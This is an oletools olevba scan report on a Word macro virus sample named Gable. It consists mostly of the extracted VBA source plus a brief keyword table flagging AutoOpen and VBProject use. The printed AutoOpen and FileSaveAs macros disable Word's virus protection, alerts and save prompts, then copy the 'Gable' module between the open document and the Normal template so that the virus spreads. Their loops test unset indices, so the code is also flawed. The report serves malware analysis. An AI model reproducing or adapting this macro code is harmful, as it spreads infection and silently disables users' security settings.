olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.Gable
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.Gable - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Gable.bas 
in file: Virus.MSWord.Intended.Gable - OLE stream: 'Macros/VBA/Gable'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoOpen()
On Error GoTo Gable

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False

    For G = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Gable" Then
            DocumentInstalled = True
        End If
    Next

    For B = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Gable" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Gable", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Gable", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If

    Application.DisplayAlerts = wdAlertsAll

Gable:
End Sub

Sub FileSaveAs()
On Error GoTo Gable

    Dialogs(wdDialogFileSaveAs).Show

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False

    For G = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Gable" Then
            DocumentInstalled = True
        End If
    Next

    For B = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Gable" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Gable", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Gable", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If

    Application.DisplayAlerts = wdAlertsAll

Gable:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

